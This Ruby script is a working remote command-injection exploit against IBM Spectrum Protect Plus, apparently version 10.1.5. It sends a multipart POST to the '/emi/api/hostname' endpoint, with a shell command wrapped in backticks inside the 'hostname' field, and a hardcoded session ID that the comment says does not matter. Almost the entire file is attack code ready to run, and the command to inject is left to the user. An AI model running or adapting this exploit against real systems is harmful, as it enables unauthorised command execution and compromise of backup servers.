#!/usr/bin/env ruby -W0
# Tested against 10.1.5
require 'rex'
require 'rex/mime'

host = ARGV[0]
cmd  = ARGV[1] || "echo dafuq > touch /tmp/mc.txt"

def usage
 puts "[*] IBM Spectrum Protect Plus hostname Remote Command Injection"
 puts "[*] #{$0} <host> [cmd]"
 exit
end

usage if ARGV.size < 1

begin

sock = Rex::Proto::Http::Client.new(host, 
                                    port = "8090", 
                                    context = {}, 
                                    ssl = true)

dbl = Rex::MIME::Message.new
dbl.add_part("__.net`#{cmd}` \\\"", nil, nil, "form-data; name=\"hostname\"")
data = dbl.to_s

req = sock.request_cgi(
 {
  'uri'     => '/emi/api/hostname',
  'version' => '1.0',
  'method'  => 'POST',
  'ctype'   => "multipart/form-data; boundary=#{dbl.bound}",
  'data'    => data,
  'headers' => {
  'x-ac-sessionid' => "1d734579-664a-4fd3-a474-a27540e6f6fc", # no matter.
  },
 })

sock.send_request(req)
data = sock.read_response()
rescue => e
puts "[!] #{e.to_s}"
end
